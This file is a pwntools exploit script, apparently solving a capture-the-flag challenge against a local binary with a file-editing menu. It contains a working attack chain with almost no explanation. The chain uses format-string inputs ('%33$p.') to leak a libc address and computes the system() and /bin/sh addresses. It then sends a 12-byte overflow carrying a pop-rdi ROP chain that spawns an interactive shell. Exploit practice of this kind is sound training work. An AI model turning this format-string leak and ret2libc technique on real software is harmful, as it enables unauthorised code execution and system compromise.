#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'.'
# Stripped:   No

io = start()

def menu(ch):
    io.recvuntil(b'> ')
    io.sendline(str(ch).encode())

for i in range(4):
    menu(1)
    io.recvuntil(b"Enter file name: ")
    io.sendline(b"%33$p.")
    io.recvuntil(b"Enter file contents: ")
    io.sendline(b"%33$p.")

menu(2)
io.recvuntil(b"Enter file index: ")
io.sendline(b"3")
io.recvuntil(b"Filename: ")
io.recvline()
io.recvuntil(b"Contents: ")


data = io.recvline().strip()
log.info(data)
leak_vals = data.split(b'.')[0].split()
log.info(f"raw leaks: {leak_vals}")
leak = int(leak_vals[0], 16) 
log.success(f"Leaked pointer libc: {hex(leak)}")

LIBC_BASE = leak - 0x27769
SYSTEM    = LIBC_BASE + libc.symbols['system']
BINSH     = LIBC_BASE + next(libc.search(b"/bin/sh"))


log.info(f"libc base = {hex(LIBC_BASE)}")
log.info(f"system()  = {hex(SYSTEM)}")
log.info(f"/bin/sh   = {hex(BINSH)}")

rop = ROP(libc)
pop_rdi = LIBC_BASE + rop.find_gadget(['pop rdi', 'ret'])[0]
ret = LIBC_BASE + rop.find_gadget(['ret'])[0]
binsh = LIBC_BASE + next(libc.search(b'/bin/sh'))

offset = 12 

payload = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(binsh),
    p64(ret),
    p64(SYSTEM)
)

menu(3)
io.recvuntil(b"Enter file index: ")
io.sendline(b"0")
io.recvuntil(b"Enter new content: ")
io.sendline(payload)

io.interactive()

